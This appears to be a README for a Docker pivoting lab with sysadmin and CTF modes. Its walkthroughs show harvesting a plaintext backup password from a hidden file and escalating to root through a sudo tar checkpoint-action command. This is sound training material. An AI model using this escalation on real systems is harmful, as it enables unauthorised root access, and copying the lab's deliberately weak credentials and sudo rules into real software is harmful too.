# 🔐 Ligolo Multi-Hop Pivot Lab (Docker Edition)

![Docker](https://img.shields.io/badge/Docker-Required-blue)
![Compose](https://img.shields.io/badge/Docker%20Compose-v2+-blue)
![Mode](https://img.shields.io/badge/Modes-Sysadmin%20%7C%20CTF-purple)
![Lab](https://img.shields.io/badge/Purpose-Training-lightgrey)

A reproducible, profile-driven multi-hop pivoting lab built entirely with Docker.

Designed for practicing:

* Multi-hop pivoting (Ligolo-ng, SOCKS, TUN-based tooling)
* Linux enumeration
* Credential discovery
* Privilege escalation
* Internal network segmentation
* Lateral movement simulation

---

# 🗺 Architecture

```text
Kali VM
  │
  ├── dmz_net (172.31.50.0/24)
  │       └── pivot1
  │
  ├── internal1_net (10.200.1.0/24)
  │       └── pivot2
  │
  └── internal2_net (10.200.2.0/24)
          └── target (nginx)
```

---

# 🧩 Lab Modes

---

## 🔵 Sysadmin Misconfiguration Mode

Simulates a realistic operational mistake in an internal Linux environment.

```bash
docker compose --profile sysadmin up -d --build
```

<details>
<summary><strong>▶ Reveal Suggested Attack Path</strong></summary>

### Enumeration

Start as low-privileged user:

```bash
docker exec -it -u websvc pivot1 bash
```

Check for operational artifacts:

```bash
ls -la /usr/local/bin
cat /usr/local/bin/.backup_env
```

You should discover:

```
BACKUP_PASS=backup123
```

---

### User Pivot

```bash
su - backup
# password: backup123
```

---

### Privilege Escalation

Enumerate sudo:

```bash
sudo -l
```

Exploit tar permission:

```bash
sudo tar -cf /dev/null /dev/null \
  --checkpoint=1 \
  --checkpoint-action=exec=/bin/bash
```

You now have root.

</details>

---

## 🔴 CTF Mode

Puzzle-style challenge mode with encoded clues.

```bash
docker compose --profile ctf up -d --build
```

<details>
<summary><strong>▶ Reveal Suggested Attack Path</strong></summary>

### Find the Clue

Start as:

```bash
docker exec -it -u websvc pivot1 bash
```

Search web directory:

```bash
cat /var/www/html/notes.txt
```

Decode:

```bash
echo "<base64_string>" | base64 -d
```

This reveals the backup password.

---

### Pivot and Escalate

```bash
su - backup
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Root achieved.

</details>

---

# 👤 Default Users (Lab Only)

| User   | Purpose                                  |
| ------ | ---------------------------------------- |
| websvc | Initial foothold                         |
| backup | Operational account (misconfigured sudo) |
| admin  | Standard interactive user                |

---

# 🔄 Switching Modes

```bash
docker compose --profile sysadmin down -v
docker volume rm ligololab_seed 2>/dev/null || true
```

Then:

```bash
docker compose --profile ctf up -d --build
```

---

# ⚠️ Security Notice

This lab is intended for:

* Offline environments
* Private research
* Controlled experimentation

Do not expose to public networks.
